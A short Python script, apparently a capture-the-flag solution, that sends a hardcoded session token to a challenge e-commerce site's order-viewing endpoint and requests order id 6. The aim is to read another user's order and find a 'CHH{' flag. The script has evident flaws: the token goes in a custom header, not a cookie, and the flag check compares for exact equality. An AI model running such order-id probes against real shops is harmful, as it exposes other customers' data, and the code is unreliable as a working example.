import requests

session_header = ".eJw1i0EKhDAMAL8Scy7CXn2F12URqU2KhWAlMQcR_24P62kOM3PhnCXayobD70I4GtA8JTbDgKPWXITBd4oHE_xNdpGzw-kO71K2XFv_ra5QlVhhjQYL8wa7xMTUt3oK6MY6F8Lhcz80BSnt.ZHiyMQ.U5-5GpjfJ54OIC-KvN2PKZfbSt8"
url = "http://basic-e-commerce-ec8f6121.dailycookie.cloud/view_order"

session = requests.Session()
session.headers["session"] = session_header


params = {"id": 6}
r = session.get(url, params=params)
if r.text == "CHH{":
    print(r.text)